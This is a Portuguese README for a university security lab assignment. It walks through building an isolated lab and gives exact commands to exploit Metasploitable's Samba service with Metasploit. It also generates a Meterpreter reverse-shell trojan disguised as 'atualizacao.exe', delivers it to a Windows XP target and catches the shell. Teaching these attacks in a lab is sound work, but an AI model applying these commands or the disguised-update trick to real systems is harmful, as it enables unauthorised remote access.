# SI-Prova4

Esta atividade prática tem como objetivo demonstrar, em ambiente controlado, a identificação e exploração de falhas de segurança em diferentes contextos e sistemas operacionais. O aluno deverá configurar um laboratório isolado utilizando o Kali Linux como estação atacante e duas máquinas alvo: uma instância Linux (Metasploitable) para testes de exploração de serviços e uma máquina Windows para simular um ataque via execução de arquivo malicioso. É obrigatório o uso de redes internas virtuais e snapshots para garantir a integridade do laboratório, reforçando que todas as ações devem seguir preceitos éticos e ser realizadas apenas em sistemas autorizados.

O primeiro teste consiste no reconhecimento e exploração direta da máquina Linux, onde o aluno deve identificar um serviço vulnerável, selecionar o exploit adequado no framework Metasploit e obter acesso ao sistema. No segundo cenário, focado na máquina Windows, o aluno deverá gerar um payload (executável malicioso) que funcione como uma porta de entrada — simulando um cavalo de troia — e configurar um sistema de escuta no Kali Linux. O objetivo é demonstrar o ganho de acesso remoto após a execução do arquivo na máquina alvo, evidenciando como falhas humanas e arquivos suspeitos podem comprometer a segurança de uma estação de trabalho.

# Apresentação

[Link da Apresentação](https://youtu.be/Xv6odgwwQRk)

# Instalando as máquinas virtuais

## Metasploitable
https://sourceforge.net/projects/metasploitable/
(cria no VirtualBox e adiciona o vmdk (disco virtual)
(troca o adaptador 1 para rede interna - intnet)
(usuário e senha = msfadmin)

## Kali Linux
https://www.kali.org/docs/virtualization/import-premade-virtualbox/
(ascrescenta no VirtualBox (VM vem inteira))
(troca o adaptador 1 para rede interna - intnet)
(usuário e senha = kali)

## Windows XP
https://massgrave.dev/windows_xp_links#windows-xp-sp3-vl-x86
(já possuía uma que foi usada em Laboratório de Redes e apenas a clonei)
(troca o adaptador 1 para rede interna - intnet)

# Configurando os IPs temporários de cada máquina:

## Metasploitable
sudo ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up

## Kali
sudo ifconfig eth0 192.168.1.11 netmask 255.255.255.0 up

## Windows
Win + R, digite ncpa.cpl
Endereço IP: 192.168.1.12
Máscara de sub-rede: 255.255.255.0

# Explorando falhas

(dentro do kali iremos explorar o Metasploitable
nmap -Pn -sV 192.168.1.10
(Veja que a porta 21 está aberta)
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.10
set LHOST 192.168.1.11
exploit
whoami

(ainda dentro do kali, iremos explorar o Windows)
(num novo terminal)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=4444 -f exe > atualizacao.exe
python3 -m http.server 80
(em um outro terminal)
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.11
set LPORT 4444
exploit
(agora no Windows)
Abrir Painel de Controle > Conexões de rede e de Internet > Opções de Internet > Conexões > Configurações da LAN > Desmarcar Servidor Proxy
(no navegador) http://192.168.1.11
(baixar atualizacao.exe)
(voltando para o kali)
sysinfo 
